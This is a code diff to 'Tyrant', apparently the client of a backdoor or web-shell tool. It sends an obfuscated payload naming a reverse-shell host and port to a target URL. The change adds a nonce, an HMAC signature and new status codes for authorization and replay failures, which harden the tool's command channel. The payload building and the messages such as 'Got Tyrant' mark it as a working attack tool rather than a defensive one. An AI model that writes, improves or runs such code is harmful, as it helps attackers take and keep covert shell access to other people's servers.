@@ -74,12 +74,24 @@ class Tyrant:
         
         return random.choice(user_agents)
     
+    def generate_nonce(self):
+        import secrets
+        return secrets.token_hex(16)
+    
+    def compute_hmac(self, data):
+        import hmac
+        import hashlib
+        mac = hmac.new(self.args.id.encode('utf-8'), data.encode('utf-8'), hashlib.sha256)
+        return self.base64url_encode(mac.digest())
+    
     def send_payload(self):
+        nonce = self.generate_nonce()
         data = json.dumps({
             "id": self.args.id,
             "uid": str(self.args.uid),
             "rhost": self.args.rhost,
             "rport": str(self.args.rport),
+            "nonce": nonce,
         }, separators=(',', ':'))
 
         print(f"[*] Acquiring Target: {self.args.url}")
@@ -93,7 +105,10 @@ class Tyrant:
         p2 = self.reverse_string(self.args.id).encode('utf-8')
         p2_e = self.xor_encrypt(self.get_timestamp().encode('utf-8'), p2)
         payload_2 = self.base64url_encode(p2_e)
-        payload = {'tyrant': header+'.'+payload_1+'.'+payload_2}
+        # HMAC signature
+        signed_data = header + '.' + payload_1 + '.' + payload_2
+        signature = self.compute_hmac(signed_data)
+        payload = {'tyrant': header+'.'+payload_1+'.'+payload_2+'.'+signature}
 
         try:
             response = requests.post(
@@ -116,6 +131,10 @@ class Tyrant:
                     print("[!] Tyrant can't seem to execute executables")
                 elif status_code == 4132:
                     print("[+] Got Tyrant.....")
+                elif status_code == 4133:
+                    print("[!] Authorization failed: UID not in allowed list")
+                elif status_code == 4134:
+                    print("[!] Replay attack detected or invalid nonce")
                 else:
                     print("[Oops!] Tyrant got an unknown error")
             else:
